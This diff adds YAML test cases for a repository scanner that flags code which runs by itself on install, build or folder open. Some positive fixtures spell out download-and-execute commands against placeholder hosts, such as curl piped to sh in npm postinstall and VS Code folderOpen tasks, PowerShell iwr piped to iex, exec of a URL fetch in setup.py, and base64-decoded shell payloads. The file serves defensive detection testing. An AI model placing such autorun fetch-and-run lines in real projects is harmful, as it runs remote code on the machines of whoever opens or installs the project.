@@ -1,0 +1,812 @@
+# Test cases for area autorun. Files are created under tmp_path only; contents are
+# harmless dummies with placeholder domains and are never executed.
+
+RC-AUTO-001:
+  positive:
+    - name: postinstall script
+      files:
+        package.json: |
+          {
+            "name": "demo",
+            "scripts": {
+              "postinstall": "node scripts/setup.js"
+            }
+          }
+      expect: [{path: package.json, line: 4}]
+    - name: preinstall in a nested package
+      files:
+        packages/app/package.json: '{"scripts": {"preinstall": "echo hi"}}'
+      expect: [{path: packages/app/package.json, line: 1}]
+  negative:
+    - name: only build and test scripts
+      files:
+        package.json: '{"name": "demo", "scripts": {"build": "tsc -p .", "test": "vitest"}}'
+    - name: install script of a vendored dependency
+      files:
+        node_modules/dep/package.json: '{"scripts": {"install": "node-gyp rebuild"}}'
+    - name: lifecycle names only appear as values
+      files:
+        package.json: '{"description": "postinstall", "scripts": {"lint": "echo postinstall"}}'
+
+RC-AUTO-002:
+  positive:
+    - name: prepare script
+      files:
+        package.json: '{"scripts": {"prepare": "husky"}}'
+      expect: [{path: package.json, line: 1}]
+    - name: prepack script
+      files:
+        package.json: |
+          {
+            "scripts": {"prepack": "npm run build"}
+          }
+      expect: [{path: package.json, line: 2}]
+  negative:
+    - name: prepublishOnly is not run on install
+      files:
+        package.json: '{"scripts": {"prepublishOnly": "npm test", "build": "tsc"}}'
+
+RC-AUTO-003:
+  positive:
+    - name: postinstall pipes a download into a shell
+      files:
+        package.json: |
+          {
+            "scripts": {
+              "postinstall": "curl -s https://example.invalid/x.sh | sh"
+            }
+          }
+      expect: [{path: package.json, line: 3}]
+    - name: preinstall runs a PowerShell download
+      files:
+        package.json: '{"scripts": {"preinstall": "powershell -c \"iwr https://example.invalid/a.ps1 | iex\""}}'
+      expect: [{path: package.json, line: 1}]
+    - name: install decodes a payload
+      files:
+        package.json: '{"scripts": {"install": "echo ZWNobyBoaQ== | base64 -d | sh"}}'
+      expect: [{path: package.json, line: 1}]
+  negative:
+    - name: postinstall runs a local script
+      files:
+        package.json: '{"scripts": {"postinstall": "node scripts/postinstall.js", "prepare": "husky"}}'
+    - name: download in a script that is not a lifecycle script
+      files:
+        package.json: '{"scripts": {"health": "curl -s https://example.invalid/health"}}'
+
+RC-AUTO-010:
+  positive:
+    - name: setup.py at the root
+      files:
+        setup.py: "from setuptools import setup\nsetup(name='demo')\n"
+      expect: [{path: setup.py}]
+    - name: setup.py in a subpackage
+      files:
+        python/setup.py: "from setuptools import setup\nsetup()\n"
+      expect: [{path: python/setup.py}]
+  negative:
+    - name: only declarative configuration
+      files:
+        setup.cfg: "[metadata]\nname = demo\n"
+        pyproject.toml: "[project]\nname = \"demo\"\n"
+    - name: similar file names
+      files:
+        mysetup.py: "print('x')\n"
+        docs/setup.py.txt: "setup()\n"
+
+RC-AUTO-011:
+  positive:
+    - name: setup.py starts a process
+      files:
+        setup.py: |
+          import subprocess
+          subprocess.check_call(["make", "all"])
+          from setuptools import setup
+          setup(name="demo")
+      expect: [{path: setup.py, line: 2}]
+    - name: setup.py downloads and executes code
+      files:
+        setup.py: |
+          from urllib.request import urlopen
+          exec(urlopen("https://example.invalid/x.py").read())
+      expect: [{path: setup.py, line: 2}]
+    - name: setup.py decodes a payload via an alias
+      files:
+        setup.py: |
+          import base64 as b
+          code = b.b64decode("cHJpbnQoMSk=")
+      expect: [{path: setup.py, line: 2}]
+  negative:
+    - name: plain setup with file reading
+      files:
+        setup.py: |
+          import os
+          from setuptools import setup
+          with open(os.path.join(os.path.dirname(__file__), "README.md")) as fh:
+              long_description = fh.read()
+          setup(name="demo", long_description=long_description)
+    - name: names only in strings and comments
+      files:
+        setup.py: |
+          # subprocess.run is not used here
+          from setuptools import setup
+          setup(name="demo", description="no exec(), no eval()")
+
+RC-AUTO-012:
+  positive:
+    - name: custom install command
+      files:
+        setup.py: |
+          from setuptools import setup
+          from setuptools.command.install import install
+          class Install(install):
+              pass
+          setup(name="demo", cmdclass={"install": Install})
+      expect: [{path: setup.py, line: 5}]
+    - name: distutils setup with cmdclass
+      files:
+        setup.py: |
+          import distutils.core
+          distutils.core.setup(
+              name="demo",
+              cmdclass={},
+          )
+      expect: [{path: setup.py, line: 4}]
+  negative:
+    - name: setup without cmdclass
+      files:
+        setup.py: "from setuptools import setup\nsetup(name='demo')\n"
+    - name: cmdclass keyword in another call
+      files:
+        setup.py: "def configure(**kw):\n    return kw\nconfigure(cmdclass=None)\n"
+
+RC-AUTO-013:
+  positive:
+    - name: unknown build backend
+      files:
+        pyproject.toml: |
+          [build-system]
+          requires = ["demo-backend"]
+          build-backend = "demo_backend.api"
+      expect: [{path: pyproject.toml, line: 3}]
+  negative:
+    - name: hatchling backend
+      files:
+        pyproject.toml: |
+          [build-system]
+          requires = ["hatchling"]
+          build-backend = "hatchling.build"
+    - name: setuptools legacy backend
+      files:
+        pyproject.toml: |
+          [build-system]
+          build-backend = "setuptools.build_meta:__legacy__"
+    - name: no build-system table
+      files:
+        pyproject.toml: "[project]\nname = \"demo\"\n"
+
+RC-AUTO-014:
+  positive:
+    - name: in-tree build backend
+      files:
+        pyproject.toml: |
+          [build-system]
+          requires = []
+          build-backend = "backend"
+          backend-path = ["_build"]
+      expect: [{path: pyproject.toml, line: 4}]
+  negative:
+    - name: sample package in test data
+      files:
+        tests/data/packages/local_backend/pyproject.toml: |
+          [build-system]
+          requires = []
+          build-backend = "backend"
+          backend-path = ["."]
+    - name: regular build-system table
+      files:
+        pyproject.toml: |
+          [build-system]
+          requires = ["setuptools"]
+          build-backend = "setuptools.build_meta"
+
+RC-AUTO-020:
+  positive:
+    - name: folderOpen task in JSONC with comments and trailing commas
+      files:
+        .vscode/tasks.json: |
+          // Tasks for this workspace
+          {
+            "version": "2.0.0",
+            "tasks": [
+              {
+                "label": "build",
+                "type": "shell",
+                "command": "echo build",
+              },
+              {
+                "label": "init",
+                "type": "shell",
+                "command": "echo init",
+                /* starts on open */
+                "runOptions": { "runOn": "folderOpen" },
+              },
+            ],
+          }
+      expect: [{path: .vscode/tasks.json, line: 15}]
+    - name: folderOpen task in a subfolder workspace
+      files:
+        tools/.vscode/tasks.json: '{"tasks": [{"label": "x", "runOptions": {"runOn": "folderOpen"}}]}'
+      expect: [{path: tools/.vscode/tasks.json, line: 1}]
+  negative:
+    - name: task runs only on demand
+      files:
+        .vscode/tasks.json: |
+          {"version": "2.0.0", "tasks": [{"label": "build", "command": "echo build", "runOptions": {"runOn": "default"}}]}
+    - name: runOn folderOpen in a file VS Code does not read as tasks
+      files:
+        docs/tasks.json: '{"tasks": [{"runOptions": {"runOn": "folderOpen"}}]}'
+    - name: folderOpen only mentioned in a label
+      files:
+        .vscode/tasks.json: '{"tasks": [{"label": "folderOpen", "command": "echo hi"}]}'
+
+RC-AUTO-021:
+  positive:
+    - name: folderOpen task pipes a download into a shell
+      files:
+        .vscode/tasks.json: |
+          {
+            "version": "2.0.0",
+            "tasks": [
+              {
+                "label": "init",
+                "type": "shell",
+                "command": "curl -s https://example.invalid/i.sh | sh",
+                "runOptions": {"runOn": "folderOpen"}
+              }
+            ]
+          }
+      expect: [{path: .vscode/tasks.json, line: 7}]
+    - name: Windows variant of the task runs an encoded command
+      files:
+        .vscode/tasks.json: |
+          {
+            "tasks": [{
+              "label": "init",
+              "command": "echo",
+              "windows": {"command": "powershell -enc ZQBjAGgAbwAgAGgAaQAgAHQAaABlAHIAZQAgAGYAcgBpAGUAbgBkAA=="},
+              "runOptions": {"runOn": "folderOpen"}
+            }]
+          }
+      expect: [{path: .vscode/tasks.json, line: 5}]
+  negative:
+    - name: folderOpen task starts a local watcher
+      files:
+        .vscode/tasks.json: '{"tasks": [{"label": "watch", "command": "npm run watch", "runOptions": {"runOn": "folderOpen"}}]}'
+    - name: download task that does not start on folder open
+      files:
+        .vscode/tasks.json: '{"tasks": [{"label": "fetch", "command": "curl -s https://example.invalid/x | sh"}]}'
+
+RC-AUTO-022:
+  positive:
+    - name: interpreter inside the repository
+      files:
+        .vscode/settings.json: |
+          {
+            "python.defaultInterpreterPath": "./tools/python.exe"
+          }
+      expect: [{path: .vscode/settings.json, line: 2}]
+    - name: terminal profile runs a shell from the workspace
+      files:
+        .vscode/settings.json: |
+          {
+            "terminal.integrated.profiles.windows": {
+              "repo": {"path": "${workspaceFolder}\\bin\\shell.cmd"}
+            }
+          }
+      expect: [{path: .vscode/settings.json, line: 3}]
+    - name: tool executable with a relative path
+      files:
+        .vscode/settings.json: '{"php.validate.executablePath": "bin/php.exe"}'
+      expect: [{path: .vscode/settings.json, line: 1}]
+  negative:
+    - name: interpreter in a local virtual environment
+      files:
+        .vscode/settings.json: '{"python.defaultInterpreterPath": "${workspaceFolder}/.venv/Scripts/python.exe"}'
+    - name: command on PATH and absolute paths
+      files:
+        .vscode/settings.json: |
+          {
+            "python.defaultInterpreterPath": "python3",
+            "git.path": "C:\\Program Files\\Git\\bin\\git.exe",
+            "go.executablePath": "/usr/local/go/bin/go",
+            "editor.formatOnSave": true
+          }
+
+RC-AUTO-025:
+  positive:
+    - name: initializeCommand in .devcontainer/devcontainer.json
+      files:
+        .devcontainer/devcontainer.json: |
+          {
+            // runs before the container exists
+            "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+            "initializeCommand": "sh ./scripts/prepare.sh"
+          }
+      expect: [{path: .devcontainer/devcontainer.json, line: 4}]
+    - name: initializeCommand as an array in .devcontainer.json
+      files:
+        .devcontainer.json: '{"initializeCommand": ["bash", "-c", "echo hi"]}'
+      expect: [{path: .devcontainer.json, line: 1}]
+  negative:
+    - name: commands that run inside the container
+      files:
+        .devcontainer/devcontainer.json: '{"image": "x", "postCreateCommand": "pip install -e ."}'
+
+RC-AUTO-030:
+  positive:
+    - name: active post-checkout hook
+      files:
+        .git/hooks/post-checkout: "#!/bin/sh\necho checkout\n"
+      expect: [{path: .git/hooks/post-checkout}]
+    - name: active hook of a nested repository
+      files:
+        vendor/lib/.git/hooks/pre-commit: "#!/bin/sh\nexit 0\n"
+      expect: [{path: vendor/lib/.git/hooks/pre-commit}]
+  negative:
+    - name: only sample hooks
+      files:
+        .git/hooks/pre-commit.sample: "#!/bin/sh\nexit 0\n"
+        .git/hooks/pre-push.sample: "#!/bin/sh\nexit 0\n"
+    - name: hook scripts outside .git
+      files:
+        githooks/pre-commit: "#!/bin/sh\nexit 0\n"
+
+RC-AUTO-031:
+  positive:
+    - name: core.hooksPath points to repository hooks
+      files:
+        .git/config: |
+          [core]
+          	repositoryformatversion = 0
+          	hooksPath = .githooks
+      expect: [{path: .git/config, line: 3}]
+    - name: shell alias
+      files:
+        .git/config: |
+          [alias]
+          	st = !sh -c 'echo status'
+      expect: [{path: .git/config, line: 2}]
+    - name: custom filter driver
+      files:
+        .git/config: |
+          [filter "demo"]
+          	smudge = python tools/smudge.py
+      expect: [{path: .git/config, line: 2}]
+  negative:
+    - name: configuration of a fresh clone
+      files:
+        .git/config: |
+          [core]
+          	repositoryformatversion = 0
+          	filemode = false
+          	bare = false
+          	logallrefupdates = true
+          	symlinks = false
+          	ignorecase = true
+          [remote "origin"]
+          	url = https://example.invalid/demo.git
+          	fetch = +refs/heads/*:refs/remotes/origin/*
+          [branch "main"]
+          	remote = origin
+          	merge = refs/heads/main
+    - name: Git LFS, built-in credential helper, plain aliases and pager switches
+      files:
+        .git/config: |
+          [filter "lfs"]
+          	clean = git-lfs clean -- %f
+          	smudge = git-lfs smudge -- %f
+          	process = git-lfs filter-process
+          	required = true
+          [credential]
+          	helper = manager
+          [alias]
+          	st = status
+          [pager]
+          	log = false
+
+RC-AUTO-032:
+  positive:
+    - name: fsmonitor runs a script
+      files:
+        .git/config: |
+          [core]
+          	fsmonitor = ./.git/fsm.sh
+      expect: [{path: .git/config, line: 2}]
+  negative:
+    - name: built-in fsmonitor switched on
+      files:
+        .git/config: "[core]\n\tfsmonitor = true\n"
+    - name: fsmonitor as a bare switch
+      files:
+        .git/config: "[core]\n\tfsmonitor\n\tuntrackedcache = true\n"
+
+RC-AUTO-040:
+  positive:
+    - name: Makefile pipes a download into bash
+      files:
+        Makefile: "install:\n\tcurl -fsSL https://example.invalid/install.sh | bash\n"
+      expect: [{path: Makefile, line: 2}]
+    - name: justfile with wget into sh
+      files:
+        justfile: "setup:\n    wget -qO- https://example.invalid/x | sh\n"
+      expect: [{path: justfile, line: 2}]
+    - name: make include file runs a PowerShell download
+      files:
+        build/tools.mk: "win:\n\tpowershell -c \"iex (iwr https://example.invalid/a.ps1)\"\n"
+      expect: [{path: build/tools.mk, line: 2}]
+  negative:
+    - name: Makefile only downloads data
+      files:
+        Makefile: "data:\n\tcurl -o data.json https://example.invalid/data.json\n"
+    - name: install instructions in a README
+      files:
+        README.md: "curl -fsSL https://example.invalid/install.sh | bash\n"
+
+RC-AUTO-050:
+  positive:
+    - name: desktop.ini icon on a remote share
+      files:
+        desktop.ini: |
+          [.ShellClassInfo]
+          IconResource=\\server.example.invalid\share\icon.ico,0
+      expect: [{path: desktop.ini, line: 2}]
+    - name: internet shortcut with a remote icon
+      files:
+        docs/site.url: |
+          [InternetShortcut]
+          URL=https://example.invalid/
+          IconFile=\\files.example.invalid\icons\a.ico
+          IconIndex=0
+      expect: [{path: docs/site.url, line: 3}]
+    - name: library-ms with a WebDAV location
+      files:
+        a.library-ms: |
+          <?xml version="1.0" encoding="UTF-8"?>
+          <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+            <searchConnectorDescriptionList><searchConnectorDescription><simpleLocation>
+              <url>https://files.example.invalid/share</url>
+            </simpleLocation></searchConnectorDescription></searchConnectorDescriptionList>
+          </libraryDescription>
+      expect: [{path: a.library-ms, line: 4}]
+  negative:
+    - name: internet shortcut with a local icon
+      files:
+        site.url: |
+          [InternetShortcut]
+          URL=https://example.invalid/
+          IconFile=C:\Windows\System32\shell32.dll
+    - name: desktop.ini with a system icon
+      files:
+        desktop.ini: |
+          [.ShellClassInfo]
+          IconResource=%SystemRoot%\system32\imageres.dll,-3
+    - name: UNC path in a text file Explorer does not interpret
+      files:
+        notes.txt: "Share: \\\\server.example.invalid\\share\\\n"
+
+# --- M2e ----------------------------------------------------------------------------------
+
+RC-AUTO-004:
+  positive:
+    - name: yarnPath to a committed release
+      files:
+        .yarnrc.yml: |
+          nodeLinker: node-modules
+          yarnPath: .yarn/releases/yarn-4.5.0.cjs
+      expect: [{path: .yarnrc.yml, line: 2}]
+    - name: plugin from the repository and Yarn 1 yarn-path
+      files:
+        .yarnrc.yml: |
+          plugins:
+            - path: .yarn/plugins/@yarnpkg/plugin-demo.cjs
+        packages/a/.yarnrc: |
+          yarn-path "../../tools/yarn.js"
+      expect: [{path: .yarnrc.yml, line: 2}, {path: packages/a/.yarnrc, line: 1}]
+  negative:
+    - name: other Yarn settings
+      files:
+        .yarnrc.yml: |
+          nodeLinker: node-modules
+          # yarnPath: .yarn/releases/yarn.cjs
+          enableTelemetry: false
+
+RC-AUTO-005:
+  positive:
+    - name: script-shell in .npmrc
+      files:
+        .npmrc: |
+          script-shell=./tools/sh.js
+      expect: [{path: .npmrc, line: 1}]
+    - name: node-options preloads a module
+      files:
+        .npmrc: |
+          save-exact=true
+          node-options=--require ./scripts/hook.js
+      expect: [{path: .npmrc, line: 2}]
+  negative:
+    - name: harmless node-options and comments
+      files:
+        .npmrc: |
+          node-options=--max-old-space-size=4096
+          ; script-shell=bash
+          engine-strict=true
+
+RC-AUTO-006:
+  positive:
+    - name: pnpm hook file
+      files:
+        .pnpmfile.cjs: "module.exports = { hooks: {} }\n"
+      expect: [{path: .pnpmfile.cjs}]
+  negative:
+    - name: pnpm workspace file only
+      files:
+        pnpm-workspace.yaml: "packages: ['packages/*']\n"
+
+RC-AUTO-015:
+  positive:
+    - name: hatch custom build hook
+      files:
+        pyproject.toml: |
+          [build-system]
+          requires = ["hatchling"]
+          build-backend = "hatchling.build"
+
+          [tool.hatch.build.hooks.custom]
+          path = "build_hook.py"
+      expect: [{path: pyproject.toml, line: 5}]
+    - name: poetry build script
+      files:
+        pyproject.toml: |
+          [tool.poetry.build]
+          script = "build.py"
+      expect: [{path: pyproject.toml}]
+  negative:
+    - name: hatch without hooks
+      files:
+        pyproject.toml: |
+          [tool.hatch.build.targets.wheel]
+          packages = ["src/demo"]
+
+RC-AUTO-016:
+  positive:
+    - name: pth file that imports a module
+      files:
+        src/demo_init.pth: "import demo_bootstrap\n"
+      expect: [{path: src/demo_init.pth, line: 1}]
+  negative:
+    - name: pth file with paths only
+      files:
+        src/paths.pth: "../lib\n./vendor\n"
+
+RC-AUTO-017:
+  positive:
+    - name: sitecustomize module
+      files:
+        tools/sitecustomize.py: "print('loaded')\n"
+      expect: [{path: tools/sitecustomize.py}]
+  negative:
+    - name: similar name
+      files:
+        tools/site_custom.py: "x = 1\n"
+
+RC-AUTO-026:
+  positive:
+    - name: postCreateCommand
+      files:
+        .devcontainer/devcontainer.json: |
+          {
+            "image": "mcr.microsoft.com/devcontainers/python:3",
+            "postCreateCommand": "pip install -e ."
+          }
+      expect: [{path: .devcontainer/devcontainer.json, line: 3}]
+  negative:
+    - name: image and extensions only
+      files:
+        .devcontainer/devcontainer.json: '{"image": "x", "customizations": {"vscode": {"extensions": ["ms-python.python"]}}}'
+
+RC-AUTO-041:
+  positive:
+    - name: direnv file
+      files:
+        .envrc: "export PATH=$PWD/bin:$PATH\n"
+      expect: [{path: .envrc}]
+  negative:
+    - name: env example file
+      files:
+        .env.example: "API_URL=https://example.invalid\n"
+
+RC-AUTO-042:
+  positive:
+    - name: mise enter hook
+      files:
+        mise.toml: |
+          [hooks]
+          enter = "echo hello"
+      expect: [{path: mise.toml, line: 2}]
+    - name: mise sources a script
+      files:
+        .mise.toml: |
+          [env]
+          _.source = "./scripts/env.sh"
+      expect: [{path: .mise.toml}]
+  negative:
+    - name: tool versions only
+      files:
+        mise.toml: |
+          [tools]
+          node = "22"
+          python = "3.12"
+
+RC-AUTO-051:
+  positive:
+    - name: shortcut next to documents
+      files:
+        docs/Invoice.lnk: {base64: "TAAAAAEUAgAAAAAAwAAAAAAAAEY="}
+      expect: [{path: docs/Invoice.lnk}]
+  negative:
+    - name: Markdown about shortcuts
+      files:
+        docs/shortcuts.md: "Create a .lnk file in the start menu.\n"
+
+RC-AUTO-033:
+  positive:
+    - name: custom clean/smudge filter
+      files:
+        .gitattributes: |
+          *.cfg filter=decrypt
+      expect: [{path: .gitattributes, line: 1}]
+  negative:
+    - name: LFS and built-in diff drivers
+      files:
+        .gitattributes: |
+          *.png filter=lfs diff=lfs merge=lfs -text
+          *.py diff=python
+          *.md merge=union
+          # *.x filter=custom
+
+RC-AUTO-060:
+  positive:
+    - name: pull_request_target checks out the PR head
+      files:
+        .github/workflows/ci.yml: |
+          on: pull_request_target
+          jobs:
+            build:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: actions/checkout@v4
+                  with:
+                    ref: ${{ github.event.pull_request.head.sha }}
+                - run: npm ci && npm test
+      expect: [{path: .github/workflows/ci.yml, line: 8}]
+  negative:
+    - name: pull_request_target without checking out PR code
+      files:
+        .github/workflows/label.yml: |
+          on: pull_request_target
+          jobs:
+            label:
+              runs-on: ubuntu-latest
+              steps:
+                - uses: actions/labeler@v5
+    - name: ordinary pull_request workflow with head ref
+      files:
+        .github/workflows/ci.yml: |
+          on: pull_request
+          jobs:
+            build:
+              steps:
+                - uses: actions/checkout@v4
+                  with:
+                    ref: ${{ github.event.pull_request.head.sha }}
+
+RC-AUTO-061:
+  positive:
+    - name: workflow decodes and runs a payload
+      files:
+        .github/workflows/release.yml: |
+          jobs:
+            r:
+              steps:
+                - run: echo ZWNobyBoYXJtbGVzcw== | base64 -d | sh
+      expect: [{path: .github/workflows/release.yml, line: 4}]
+  negative:
+    - name: decoded API content written to a file
+      files:
+        .github/workflows/bots.yml: |
+          jobs:
+            r:
+              steps:
+                - run: gh api repos/x/contents/s.sh --jq .content | base64 -d > /tmp/s.sh
+    - name: workflow without encoded commands
+      files:
+        .github/workflows/ci.yml: |
+          jobs:
+            t:
+              steps:
+                - run: pytest -q
+
+RC-AUTO-070:
+  positive:
+    - name: Exec task in a project file
+      files:
+        src/App/App.csproj: |
+          <Project Sdk="Microsoft.NET.Sdk">
+            <Target Name="Pre" BeforeTargets="Build">
+              <Exec Command="npm run build" />
+            </Target>
+          </Project>
+      expect: [{path: src/App/App.csproj, line: 3}]
+    - name: Exec with the command on the next line
+      files:
+        Directory.Build.targets: |
+          <Project>
+            <Target Name="X" AfterTargets="Build">
+              <Exec WorkingDirectory="tools"
+                    Command="tool.exe --sync" />
+            </Target>
+          </Project>
+      expect: [{path: Directory.Build.targets, line: 3}]
+  negative:
+    - name: project without Exec
+      files:
+        App.csproj: |
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup>
+          </Project>
+
+RC-AUTO-071:
+  positive:
+    - name: Exec downloads and runs a script
+      files:
+        build/Tools.targets: |
+          <Project>
+            <Target Name="Fetch" BeforeTargets="Build">
+              <Exec Command="powershell -c &quot;iwr https://example.invalid/a.ps1 | iex&quot;" />
+            </Target>
+          </Project>
+      expect: [{path: build/Tools.targets, line: 3}]
+    - name: DownloadFile task
+      files:
+        App.csproj: |
+          <Project>
+            <Target Name="Get" BeforeTargets="Build">
+              <DownloadFile SourceUrl="https://example.invalid/tool.zip" DestinationFolder="obj" />
+            </Target>
+          </Project>
+      expect: [{path: App.csproj, line: 3}]
+  negative:
+    - name: Exec with a local command
+      files:
+        App.csproj: |
+          <Project><Target Name="P"><Exec Command="dotnet tool restore" /></Target></Project>
+
+RC-AUTO-072:
+  positive:
+    - name: inline Roslyn task
+      files:
+        Directory.Build.props: |
+          <Project>
+            <UsingTask TaskName="Hello" TaskFactory="RoslynCodeTaskFactory"
+                       AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+              <Task><Code Type="Fragment" Language="cs">Log.LogMessage("hi");</Code></Task>
+            </UsingTask>
+          </Project>
+      expect: [{path: Directory.Build.props, line: 2}]
+  negative:
+    - name: task from an assembly
+      files:
+        Directory.Build.props: |
+          <Project>
+            <UsingTask TaskName="Sign" AssemblyFile="tools/Sign.dll" />
+          </Project>
